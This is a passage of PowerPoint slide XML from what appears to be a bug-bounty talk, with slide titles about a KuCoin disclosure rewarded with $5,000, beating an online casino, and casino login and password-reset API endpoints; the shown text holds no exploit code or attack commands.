      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="573" name="Google Shape;573;p71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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4" name="Google Shape;574;p71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="575" name="Google Shape;575;p71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="235475" y="4075700"/>
            <a:ext cx="7584600" cy="554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2400">
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Discloses name, email, phone number, location, etc.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="576" name="Google Shape;576;p71"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="152400"/>
            <a:ext cx="8624825" cy="3522175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="580" name="Shape 580"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="581" name="Google Shape;581;p72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;582;p72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="583" name="Google Shape;583;p72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="584" name="Google Shape;584;p72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="585" name="Google Shape;585;p72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="949675" y="3287675"/>
            <a:ext cx="6393600" cy="631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b="1" lang="en" sz="2900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>They rated it as high and gave me $5,000</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="586" name="Google Shape;586;p72"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="411450" y="2067750"/>
            <a:ext cx="8321100" cy="780800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="590" name="Shape 590"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="591" name="Google Shape;591;p73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;592;p73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="593" name="Google Shape;593;p73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="1940700"/>
            <a:ext cx="7595100" cy="908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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating a Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>(Probably </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>the only time the house doesn’t get to win)</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="597" name="Shape 597"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="598" name="Google Shape;598;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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9" name="Google Shape;599;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="600" name="Google Shape;600;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="601" name="Google Shape;601;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="3615000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Randomly scanning ipv4 space for fun</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Normal login page with a forgot password</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/login</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	lottery-api.casinosite.com/api/v1/auth/forgot_password</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="602" name="Google Shape;602;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="606" name="Shape 606"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="607" name="Google Shape;607;p75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;608;p75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="609" name="Google Shape;609;p75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472200" y="1115875"/>
            <a:ext cx="8671800" cy="46191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t/>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/login</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
